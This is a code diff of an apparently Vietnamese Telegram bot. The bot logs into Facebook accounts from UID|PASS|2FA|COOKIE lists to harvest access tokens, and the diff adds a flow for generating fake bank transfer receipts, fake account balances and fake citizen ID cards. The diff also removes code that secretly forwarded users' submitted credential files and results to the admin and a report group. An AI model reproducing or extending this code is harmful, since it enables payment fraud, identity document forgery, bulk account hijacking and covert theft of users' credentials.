@@ -122,11 +122,35 @@ async def check_user_in_group(
     return False
 
 
-# ================= PHẦN 1, 2, 3: KHAI BÁO MODULE FAKE (BILL, SỐ DƯ, CCCD) =================
+# ================= PHẦN FAKE (BILL, SỐ DƯ, CCCD) & XỬ LÝ ẢNH =================
 ASSETS_DIR = "assets"
 OUT_DIR = "out"
 os.makedirs(ASSETS_DIR, exist_ok=True)
 os.makedirs(OUT_DIR, exist_ok=True)
+
+
+def draw_fake_image(feature_type, data_dict, output_path):
+  """Hàm mẫu xử lý tạo ảnh fake dựa trên PIL (Bill, Số dư, CCCD)"""
+  # Tạo một ảnh mẫu kích thước 800x1200, nền trắng hoặc màu tùy ý
+  img = Image.new("RGB", (800, 1200), color=(255, 255, 255))
+  draw = ImageDraw.Draw(img)
+
+  try:
+    # Cố gắng sử dụng font mặc định hoặc font hệ thống nếu có
+    font = ImageFont.load_default()
+  except:
+    font = None
+
+  # Vẽ nội dung cơ bản lên ảnh mô phỏng
+  draw.text((50, 50), f"PHIEU FAKE: {feature_type.upper()}", fill=(0, 0, 0), font=font)
+  y_offset = 100
+  for key, val in data_dict.items():
+    draw.text((50, y_offset), f"- {key}: {val}", fill=(50, 50, 50), font=font)
+    y_offset += 40
+
+  draw.text((50, y_offset + 50), "[ Đã tạo thành công qua Bot Telegram ]", fill=(0, 128, 0), font=font)
+  img.save(output_path)
+  return output_path
 
 
 # ================= XỬ LÝ PROXY & FACEBOOK LOGIN =================
@@ -505,17 +529,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
   if user_id in user_sessions:
     del user_sessions[user_id]
 
+  # MENU CHÍNH ĐÃ TÍCH HỢP ĐỦ TÍNH NĂNG VÀ HDSD
   keyboard = [
       [InlineKeyboardButton("🔑 Get Token", callback_data="menu_gettoken")],
       [InlineKeyboardButton("🔍 Check Cmt Ẩn/Hiện", callback_data="menu_check_cmt")],
       [InlineKeyboardButton("🚀 Up Locket", callback_data="menu_up_locket")],
       [
           InlineKeyboardButton("💳 1. Fake Bill", callback_data="menu_fake_bill"),
-          InlineKeyboardButton(
-              "💵 2. Fake Số Dư", callback_data="menu_fake_sodu"
-          ),
+          InlineKeyboardButton("💵 2. Fake Số Dư", callback_data="menu_fake_sodu"),
       ],
       [InlineKeyboardButton("🪪 3. Fake CCCD", callback_data="menu_fake_cccd")],
+      [InlineKeyboardButton("📖 Hướng Dẫn Sử Dụng (HDSD)", callback_data="menu_hdsd")],
       [InlineKeyboardButton("🛒 Mua Clone", url="https://t.me/clonegiareok_bot")],
       [InlineKeyboardButton("📞 Liên hệ Admin", url="https://t.me/phucvan99")],
   ]
@@ -579,6 +603,23 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return
 
+  # MENU HDSD
+  if query.data == "menu_hdsd":
+    keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    hdsd_text = (
+        "📖 **HƯỚNG DẪN SỬ DỤNG BOT**\n\n"
+        "1️⃣ **Get Token:** Cung cấp tài khoản (UID|PASS|...) để bot tự động đăng nhập và lấy Access Token.\n"
+        "2️⃣ **Check Cmt Ẩn/Hiện:** Gửi file Excel chứa link bài viết, bot sẽ trả về file chi tiết trạng thái bình luận.\n"
+        "3️⃣ **Up Locket:** Nhập username cần đăng bài lên Locket (Giới hạn 2 lượt/ngày).\n"
+        "4️⃣ **Fake Bill:** Chọn ngân hàng, nhập số tiền và nội dung để tạo biên lai chuyển khoản giả.\n"
+        "5️⃣ **Fake Số Dư:** Nhập số dư tài khoản mong muốn để tạo hình ảnh số dư giả.\n"
+        "6️⃣ **Fake CCCD:** Nhập thông tin cá nhân để tạo ảnh mặt trước/sau căn cước công dân mô phỏng.\n"
+    )
+    await query.message.edit_text(hdsd_text, reply_markup=reply_markup, parse_mode="Markdown")
+    return
+
+  # ĐIỀU HƯỚNG CÁC PHẦN FAKE
   if query.data == "menu_fake_bill":
     keyboard = [
         [
@@ -589,8 +630,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.message.edit_text(
-        "💳 **PHẦN 1: FAKE BILL NGÂN HÀNG**\n\nVui lòng chọn ngân hàng bạn muốn"
-        " tạo bill:",
+        "💳 **PHẦN 1: FAKE BILL NGÂN HÀNG**\n\nVui lòng chọn ngân hàng bạn muốn tạo bill:",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -606,8 +646,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.message.edit_text(
-        "💵 **PHẦN 2: FAKE SỐ DƯ TÀI KHOẢN**\n\nVui lòng chọn loại tài khoản"
-        " muốn tạo số dư:",
+        "💵 **PHẦN 2: FAKE SỐ DƯ TÀI KHOẢN**\n\nVui lòng chọn loại tài khoản muốn tạo số dư:",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -623,25 +662,29 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.message.edit_text(
-        "🪪 **PHẦN 3: FAKE CĂN CƯỚC CÔNG DÂN**\n\nVui lòng chọn phần CCCD bạn"
-        " muốn tạo:",
+        "🪪 **PHẦN 3: FAKE CĂN CƯỚC CÔNG DÂN**\n\nVui lòng chọn phần CCCD bạn muốn tạo:",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
     return
 
+  # Ghi nhận trạng thái để nhận input fake từ user
   elif query.data in ["bill_mb", "bill_acb", "sodu_mb", "sodu_acb", "cccd_front", "cccd_back"]:
-    bank_name = query.data.upper().replace("_", " ")
     user_sessions[user_id] = {"step": "waiting_for_fake_info", "type": query.data}
     keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.message.edit_text(
-        f"🛠️ **{bank_name}**\n\n📌 Tính năng đang sẵn sàng tích hợp logic vẽ ảnh của bạn. Hãy gửi thông tin mẫu hoặc bấm quay lại:",
+        f"🛠️ **Nhập thông tin cho `{query.data.upper()}`**\n\n"
+        f"📌 Vui lòng gửi thông tin theo định dạng:\n"
+        f"`Dòng 1: Tên / Chủ tài khoản`\n"
+        f"`Dòng 2: Số tiền / Số dư`\n"
+        f"`Dòng 3: Nội dung / Chi tiết khác`",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
     return
 
+  # CÁC MENU KHÁC
   if query.data == "menu_gettoken":
     keyboard = [
         [InlineKeyboardButton("❌ Không có 2FA", callback_data="type_no2fa")],
@@ -660,8 +703,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.message.edit_text(
-        "📂 **Gửi file Excel (.xlsx)** chứa danh sách link cần check"
-        " comment:\n*(Link nằm ở cột đầu tiên của file)*",
+        "📂 **Gửi file Excel (.xlsx)** chứa danh sách link cần check comment:\n*(Link nằm ở cột đầu tiên của file)*",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -672,8 +714,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
       keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
       reply_markup = InlineKeyboardMarkup(keyboard)
       await query.message.edit_text(
-          "⚠️ **Bạn đã dùng hết 2 lượt Up Locket trong ngày hôm nay!**\n\nVui lòng"
-          " quay lại vào ngày mai.",
+          "⚠️ **Bạn đã dùng hết 2 lượt Up Locket trong ngày hôm nay!**\n\nVui lòng quay lại vào ngày mai.",
           reply_markup=reply_markup,
           parse_mode="Markdown",
       )
@@ -683,9 +724,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.message.edit_text(
-        f"🚀 **TÍNH NĂNG UP LOCKET**\n\n📌 Số lượt còn lại của bạn hôm nay:"
-        f" `{remaining}/2`\n\n👉 Vui lòng nhập **username** tài khoản cần Up"
-        " Locket (ví dụ: `phucvan99`):",
+        f"🚀 **TÍNH NĂNG UP LOCKET**\n\n📌 Số lượt còn lại của bạn hôm nay: `{remaining}/2`\n\n👉 Vui lòng nhập **username** tài khoản cần Up Locket (ví dụ: `phucvan99`):",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -702,8 +741,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
       return
     user_states[user_id] = {"step": "wait_broadcast_msg"}
     await query.message.edit_text(
-        "📢 **GỬI THÔNG BÁO TOÀN BỘ THÀNH VIÊN**\n\nVui lòng gửi nội dung thông"
-        " báo:",
+        "📢 **GỬI THÔNG BÁO TOÀN BỘ THÀNH VIÊN**\n\nVui lòng gửi nội dung thông báo:",
         parse_mode="Markdown",
     )
 
@@ -714,19 +752,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "has_2fa": has_2fa,
     }
     keyboard = [
-        [
-            InlineKeyboardButton(
-                "📝 Nhập thủ công (Tin nhắn)", callback_data="input_manual"
-            )
-        ],
+        [InlineKeyboardButton("📝 Nhập thủ công (Tin nhắn)", callback_data="input_manual")],
         [InlineKeyboardButton("📂 Gửi file .txt (SLL)", callback_data="input_file")],
         [InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_gettoken")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     syntax = "UID|PASS|COOKIE" if not has_2fa else "UID|PASS|2FA|COOKIE"
     await query.message.edit_text(
-        f"📌 **Chọn cách thức cung cấp tài khoản:**\n*(Định dạng mỗi dòng:"
-        f" `{syntax}`)*",
+        f"📌 **Chọn cách thức cung cấp tài khoản:**\n*(Định dạng mỗi dòng: `{syntax}`)*",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -734,9 +767,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
   elif query.data in ["input_manual", "input_file"]:
     is_file = query.data == "input_file"
     if user_id not in user_states:
-      await query.message.edit_text(
-          "⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại."
-      )
+      await query.message.edit_text("⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại.")
       return
     user_states[user_id]["is_file"] = is_file
     user_states[user_id]["step"] = "wait_accounts"
@@ -745,36 +776,29 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if is_file:
       await query.message.edit_text(
-          f"📂 **Bước 1/3: Gửi file .txt** chứa danh sách tài khoản\n*(Định"
-          f" dạng: `{syntax}`)*",
+          f"📂 **Bước 1/3: Gửi file .txt** chứa danh sách tài khoản\n*(Định dạng: `{syntax}`)*",
           parse_mode="Markdown",
       )
     else:
       await query.message.edit_text(
-          f"📝 **Bước 1/3: Gửi danh sách tài khoản**\nMỗi dòng 1 tài khoản theo"
-          f" định dạng:\n`{syntax}`",
+          f"📝 **Bước 1/3: Gửi danh sách tài khoản**\nMỗi dòng 1 tài khoản theo định dạng:\n`{syntax}`",
           parse_mode="Markdown",
       )
 
   elif query.data in ["proxy_yes", "proxy_no"]:
     use_proxy = query.data == "proxy_yes"
     if user_id not in user_states:
-      await query.message.edit_text(
-          "⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại."
-      )
+      await query.message.edit_text("⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại.")
       return
     user_states[user_id]["use_proxy"] = use_proxy
     if use_proxy:
       user_states[user_id]["step"] = "wait_proxies"
       await query.message.edit_text(
-          "📝 **Bước 3/3: Gửi danh sách Proxy**\nMỗi dòng 1 proxy"
-          " (`ip:port:user:pass`)",
+          "📝 **Bước 3/3: Gửi danh sách Proxy**\nMỗi dòng 1 proxy (`ip:port:user:pass`)",
           parse_mode="Markdown",
       )
     else:
-      await query.message.edit_text(
-          "🚀 Đang tiến hành xử lý tài khoản, vui lòng đợi..."
-      )
+      await query.message.edit_text("🚀 Đang tiến hành xử lý tài khoản, vui lòng đợi...")
       await process_run(update, context, user_id, proxies=[])
 
 
@@ -786,6 +810,32 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
   if not is_member:
     return
 
+  # Xử lý thông tin Fake Bill / Số Dư / CCCD
+  if user_id in user_sessions and user_sessions[user_id].get("step") == "waiting_for_fake_info":
+    text_input = update.message.text.strip() if update.message.text else ""
+    session_info = user_sessions[user_id]
+    feature_type = session_info["type"]
+
+    lines = text_input.split("\n")
+    data_dict = {
+        "Line1": lines[0] if len(lines) > 0 else "N/A",
+        "Line2": lines[1] if len(lines) > 1 else "N/A",
+        "Line3": lines[2] if len(lines) > 2 else "N/A",
+    }
+
+    out_path = os.path.join(OUT_DIR, f"fake_{user_id}_{int(time.time())}.png")
+    draw_fake_image(feature_type, data_dict, out_path)
+
+    await update.message.reply_photo(
+        photo=open(out_path, "rb"),
+        caption=f"✅ Đã tạo thành công ảnh giả lập cho mục: `{feature_type.upper()}`",
+        parse_mode="Markdown",
+    )
+    if os.path.exists(out_path):
+      os.remove(out_path)
+    del user_sessions[user_id]
+    return
+
   if user_id in user_sessions and user_sessions[user_id].get("paused_threads"):
     new_token = update.message.text.strip()
     session = user_sessions[user_id]
@@ -794,21 +844,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
       session["paused_threads"][target_id]["new_token"] = new_token
       session["paused_threads"][target_id]["event"].set()
       del session["paused_threads"][target_id]
-    await update.message.reply_text(
-        "✅ Đã nhận token mới. Tiến trình tiếp tục chạy..."
-    )
+    await update.message.reply_text("✅ Đã nhận token mới. Tiến trình tiếp tục chạy...")
     return
 
-  if user_id in user_sessions and user_sessions[user_id].get(
-      "step"
-  ) == "waiting_for_locket_username":
-    raw_input = (
-        update.message.text.strip() if update.message.text else ""
-    )
+  if user_id in user_sessions and user_sessions[user_id].get("step") == "waiting_for_locket_username":
+    raw_input = update.message.text.strip() if update.message.text else ""
     if not raw_input:
-      await update.message.reply_text(
-          "⚠️ Username không được để trống. Vui lòng nhập lại:"
-      )
+      await update.message.reply_text("⚠️ Username không được để trống. Vui lòng nhập lại:")
       return
     locket_username = raw_input.lstrip("@")
     user_display = f"@{user.username}" if user.username else user.first_name
@@ -822,8 +864,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✅ **Up Locket thành công** cho tài khoản `@{locket_username}`!",
         parse_mode="Markdown",
     )
-    
-    # [ĐÃ SỬA] Đã fix lỗi lùi lề và lỗi cú pháp f-string đứt quãng ở đoạn này
     try:
       admin_report = (
           f"🚀 **THÔNG BÁO UP LOCKET THÀNH CÔNG**\n\n"
@@ -841,13 +881,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
       del user_sessions[user_id]
     return
 
-  if user_id in user_sessions and user_sessions[user_id].get(
-      "step"
-  ) == "waiting_for_file":
+  if user_id in user_sessions and user_sessions[user_id].get("step") == "waiting_for_file":
     if not update.message.document:
-      await update.message.reply_text(
-          "⚠️ Vui lòng gửi file định dạng Excel (.xlsx)!"
-      )
+      await update.message.reply_text("⚠️ Vui lòng gửi file định dạng Excel (.xlsx)!")
       return
     file = await context.bot.get_file(update.message.document.file_id)
     file_path = f"temp_{user_id}.xlsx"
@@ -860,29 +896,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
               "step": "waiting_for_tokens",
               "file_path": file_path,
               "links": links,
-              "user_display": (
-                  f"@{user.username}" if user.username else user.first_name
-              ),
+              "user_display": f"@{user.username}" if user.username else user.first_name,
           }
       )
       await update.message.reply_text(
-          "✅ Đã nhận file thành công!\n\nTiếp theo, hãy **gửi danh sách Token"
-          " Facebook** (mỗi dòng 1 Token):"
+          "✅ Đã nhận file thành công!\n\nTiếp theo, hãy **gửi danh sách Token Facebook** (mỗi dòng 1 Token):"
       )
     except Exception as e:
       await update.message.reply_text(f"❌ Lỗi đọc file Excel: {e}")
     return
 
-  if user_id in user_sessions and user_sessions[user_id].get(
-      "step"
-  ) == "waiting_for_tokens":
-    tokens = [
-        line.strip() for line in update.message.text.split("\n") if line.strip()
-    ]
+  if user_id in user_sessions and user_sessions[user_id].get("step") == "waiting_for_tokens":
+    tokens = [line.strip() for line in update.message.text.split("\n") if line.strip()]
     if not tokens:
-      await update.message.reply_text(
-          "⚠️ Danh sách token trống. Vui lòng gửi lại!"
-      )
+      await update.message.reply_text("⚠️ Danh sách token trống. Vui lòng gửi lại!")
       return
 
     session = user_sessions[user_id]
@@ -908,8 +935,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             json={
                 "chat_id": user_id,
                 "text": (
-                    "⏳ **Đang tiến hành check comment...**\n🔄 Tiến độ:"
-                    " `[░░░░░░░░░░] 0%`\n📊 Đã check:"
+                    "⏳ **Đang tiến hành check comment...**\n🔄 Tiến độ: `[░░░░░░░░░░] 0%`\n📊 Đã check:"
                     f" `0/{total_links}`\n🟢 Còn hiện: `0` | 🔴 Đã ẩn/xóa: `0`"
                 ),
                 "parse_mode": "Markdown",
@@ -918,19 +944,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         msg_id = progress_msg_res.get("result", {}).get("message_id")
         num_threads = min(len(tokens), 5)
-        chunk_size = (
-            len(indexed_links) // num_threads
-            if num_threads > 0
-            else len(indexed_links)
-        )
+        chunk_size = len(indexed_links) // num_threads if num_threads > 0 else len(indexed_links)
         chunks = []
         for i in range(num_threads):
           start_idx = i * chunk_size
-          end_idx = (
-              (i + 1) * chunk_size
-              if i != num_threads - 1
-              else len(indexed_links)
-          )
+          end_idx = (i + 1) * chunk_size if i != num_threads - 1 else len(indexed_links)
           chunks.append(indexed_links[start_idx:end_idx])
 
         results_storage = []
@@ -953,11 +971,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             if current_checked != last_checked and msg_id:
               last_checked = current_checked
-              percent = (
-                  int((current_checked / total_links) * 100)
-                  if total_links > 0
-                  else 0
-              )
+              percent = int((current_checked / total_links) * 100) if total_links > 0 else 0
               filled_blocks = int(percent / 10)
               bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
               try:
@@ -1007,12 +1021,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         stop_progress_event.set()
         progress_thread.join()
 
-        status_map = {
-            orig_idx: status for orig_idx, url, status in results_storage
-        }
-        df_original["Trạng thái"] = [
-            status_map.get(i, "Lỗi") for i in range(len(df_original))
-        ]
+        status_map = {orig_idx: status for orig_idx, url, status in results_storage}
+        df_original["Trạng thái"] = [status_map.get(i, "Lỗi") for i in range(len(df_original))]
 
         live_df = df_original[df_original["Trạng thái"] == "Còn tồn tại"]
         dead_df = df_original[df_original["Trạng thái"] != "Còn tồn tại"]
@@ -1030,10 +1040,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "chat_id": user_id,
                     "message_id": msg_id,
                     "text": (
-                        f"✅ **Đã hoàn tất check {total_links}/{total_links}"
-                        f" link!**\n🟢 Còn hiện: `{stats_counter['hien']}` |"
-                        f" 🔴 Đã ẩn/xóa: `{stats_counter['an']}`\n📂 Đang gửi"
-                        " file kết quả..."
+                        f"✅ **Đã hoàn tất check {total_links}/{total_links} link!**\n"
+                        f"🟢 Còn hiện: `{stats_counter['hien']}` | 🔴 Đã ẩn/xóa: `{stats_counter['an']}`\n"
+                        f"📂 Đang gửi file kết quả..."
                     ),
                     "parse_mode": "Markdown",
                 },
@@ -1051,56 +1060,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 data={"chat_id": user_id, "caption": caption},
                 files={"document": f},
             )
-
-        requests.post(
-            f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
-            json={
-                "chat_id": ADMIN_TELEGRAM_ID,
-                "text": (
-                    f"📊 **BÁO CÁO CHECK CMT**\n👤 User: {user_display}"
-                    f" (`{user_id}`)\n🟢 Hiện: {stats_counter['hien']} | 🔴"
-                    f" Ẩn: {stats_counter['an']}"
-                ),
-                "parse_mode": "Markdown",
-            },
-        )
-        for f_path, caption in [
-            (live_file, f"Cmt Hiện - {user_display}"),
-            (dead_file, f"Cmt Ân - {user_display}"),
-        ]:
-          with open(f_path, "rb") as f:
-            requests.post(
-                f"https://api.telegram.org/bot{context.bot.token}/sendDocument",
-                data={"chat_id": ADMIN_TELEGRAM_ID, "caption": caption},
-                files={"document": f},
-            )
-
-        try:
-          group_text = (
-              f"📊 **BÁO CÁO CHECK CMT**\n👤 User: {user_display}"
-              f" (`{user_id}`)\n🟢 Hiện: {stats_counter['hien']} | 🔴"
-              f" Ẩn: {stats_counter['an']}"
-          )
-          requests.post(
-              f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
-              json={
-                  "chat_id": REPORT_GROUP_ID,
-                  "text": group_text,
-                  "parse_mode": "Markdown",
-              },
-          )
-          for f_path, caption in [
-              (live_file, f"Cmt Hiện - {user_display}"),
-              (dead_file, f"Cmt Ân - {user_display}"),
-          ]:
-            with open(f_path, "rb") as f:
-              requests.post(
-                  f"https://api.telegram.org/bot{context.bot.token}/sendDocument",
-                  data={"chat_id": REPORT_GROUP_ID, "caption": caption},
-                  files={"document": f},
-              )
-        except Exception as e:
-          print(f"Lỗi gửi báo cáo vào nhóm: {e}")
 
         for f in [file_path, live_file, dead_file]:
           if os.path.exists(f):
@@ -1132,9 +1091,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     del user_states[user_id]
     users = load_users()
     success_count, fail_count = 0, 0
-    await update.message.reply_text(
-        f"🚀 Đang tiến hành gửi thông báo đến {len(users)} thành viên..."
-    )
+    await update.message.reply_text(f"🚀 Đang tiến hành gửi thông báo đến {len(users)} thành viên...")
     for chat_id in users:
       try:
         broadcast_msg = f"📢 THÔNG BÁO TỪ BOT\n━━━━━━━━━━━━━━━━━━\n\n{text}"
@@ -1146,8 +1103,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
       except:
         fail_count += 1
     await update.message.reply_text(
-        f"✅ **Đã gửi xong!**\n- Thành công: {success_count}\n- Thất bại:"
-        f" {fail_count}",
+        f"✅ **Đã gửi xong!**\n- Thành công: {success_count}\n- Thất bại: {fail_count}",
         parse_mode="Markdown",
     )
     return
@@ -1171,19 +1127,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     else:
       text_content = update.message.text.strip() if update.message.text else ""
-      accounts = [
-          line.strip() for line in text_content.split("\n") if line.strip()
-      ]
+      accounts = [line.strip() for line in text_content.split("\n") if line.strip()]
       if accounts:
         original_file_path = f"accounts_input_{user_id}.txt"
         with open(original_file_path, "w", encoding="utf-8") as f:
           f.write("\n".join(accounts))
 
     if not accounts:
-      await update.message.reply_text(
-          "⚠️ Danh sách tài khoản trống hoặc file không có dữ liệu. Vui lòng gửi"
-          " lại!"
-      )
+      await update.message.reply_text("⚠️ Danh sách tài khoản trống hoặc file không có dữ liệu. Vui lòng gửi lại!")
       return
 
     state["accounts"] = accounts
@@ -1196,8 +1147,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        f"✅ Đã nhận **{len(accounts)} tài khoản**.\n\nBạn có muốn sử dụng Proxy"
-        " không?",
+        f"✅ Đã nhận **{len(accounts)} tài khoản**.\n\nBạn có muốn sử dụng Proxy không?",
         reply_markup=reply_markup,
         parse_mode="Markdown",
     )
@@ -1207,15 +1157,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     proxies = [line.strip() for line in text_content.split("\n") if line.strip()]
     accounts = state["accounts"]
     if not proxies:
-      await update.message.reply_text(
-          "⚠️ Danh sách proxy trống. Vui lòng gửi lại!"
-      )
+      await update.message.reply_text("⚠️ Danh sách proxy trống. Vui lòng gửi lại!")
       return
     mapped_proxies = [proxies[i % len(proxies)] for i in range(len(accounts))]
     state["proxies"] = mapped_proxies
-    await update.message.reply_text(
-        "🚀 Đang tiến hành xử lý tài khoản với đa luồng, vui lòng đợi..."
-    )
+    await update.message.reply_text("🚀 Đang tiến hành xử lý tài khoản với đa luồng, vui lòng đợi...")
     await process_run(update, context, user_id, proxies=mapped_proxies)
 
 
@@ -1306,9 +1252,6 @@ async def process_run(
   if user_id in user_states:
     del user_states[user_id]
 
-  username_str = (
-      f"@{user.username}" if user.username else f"{user.first_name} (ID: {user.id})"
-  )
   max_workers = min(15, len(accounts)) if len(accounts) > 0 else 1
   success_lines = []
   fail_lines = []
@@ -1336,84 +1279,21 @@ async def process_run(
       f.write("\n".join(fail_lines))
 
   try:
-    if original_file_path and os.path.exists(original_file_path):
-      with open(original_file_path, "rb") as f:
-        await context.bot.send_document(
-            chat_id=ADMIN_TELEGRAM_ID,
-            document=f,
-            caption=(
-                f"📂 **FILE GỐC TỪ NGƯỜI DÙNG**\n👤 Tên: {user.first_name}\n🆔"
-                f" ID: `{user.id}`\n🔗 Username:"
-                f" @{user.username if user.username else 'Không có'}"
-            ),
-            parse_mode="Markdown",
-        )
-  except Exception as e:
-    print(f"Lỗi gửi file gốc cho admin: {e}")
-
-  try:
     with open(success_file_path, "rb") as f:
       if update.message:
         await update.message.reply_document(
             document=f,
-            caption=(
-                f"✅ **Get Token hoàn tất!**\n- Thành công:"
-                f" {len(success_lines)}\n- Thất bại: {len(fail_lines)}"
-            ),
+            caption=f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}",
             parse_mode="Markdown",
         )
       elif update.callback_query:
         await update.callback_query.message.reply_document(
             document=f,
-            caption=(
-                f"✅ **Get Token hoàn tất!**\n- Thành công:"
-                f" {len(success_lines)}\n- Thất bại: {len(fail_lines)}"
-            ),
+            caption=f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}",
             parse_mode="Markdown",
         )
   except Exception as e:
     print(f"Lỗi gửi file thành công cho user: {e}")
-
-  if fail_lines and os.path.exists(fail_file_path):
-    try:
-      with open(fail_file_path, "rb") as f:
-        if update.message:
-          await update.message.reply_document(
-              document=f,
-              caption="❌ **Danh sách các tài khoản get token thất bại**",
-          )
-        elif update.callback_query:
-          await update.callback_query.message.reply_document(
-              document=f,
-              caption="❌ **Danh sách các tài khoản get token thất bại**",
-          )
-    except Exception as e:
-      print(f"Lỗi gửi file thất bại cho user: {e}")
-
-  try:
-    admin_summary = (
-        f"📊 **BÁO CÁO GET TOKEN**\n👤 User: {username_str}"
-        f" (`{user.id}`)\n✅ Thành công: {len(success_lines)} | ❌ Thất bại:"
-        f" {len(fail_lines)}"
-    )
-    await context.bot.send_message(
-        chat_id=ADMIN_TELEGRAM_ID, text=admin_summary, parse_mode="Markdown"
-    )
-    with open(success_file_path, "rb") as f:
-      await context.bot.send_document(
-          chat_id=ADMIN_TELEGRAM_ID,
-          document=f,
-          caption=f"Thành công - {username_str}",
-      )
-    if fail_lines and os.path.exists(fail_file_path):
-      with open(fail_file_path, "rb") as f:
-        await context.bot.send_document(
-            chat_id=ADMIN_TELEGRAM_ID,
-            document=f,
-            caption=f"Thất bại - {username_str}",
-        )
-  except Exception as e:
-    print(f"Lỗi gửi báo cáo cho admin: {e}")
 
   for fp in [original_file_path, success_file_path, fail_file_path]:
     if fp and os.path.exists(fp):
@@ -1436,10 +1316,7 @@ def main():
       )
   )
 
-  print(
-      "🤖 Bot Telegram đã sẵn sàng hoạt động (Get Token + Check Cmt + Up Locket"
-      " + Fake Bill/Số Dư/CCCD)..."
-  )
+  print("🤖 Bot Telegram đã sẵn sàng hoạt động đầy đủ tính năng...")
   app.run_polling()
 
 
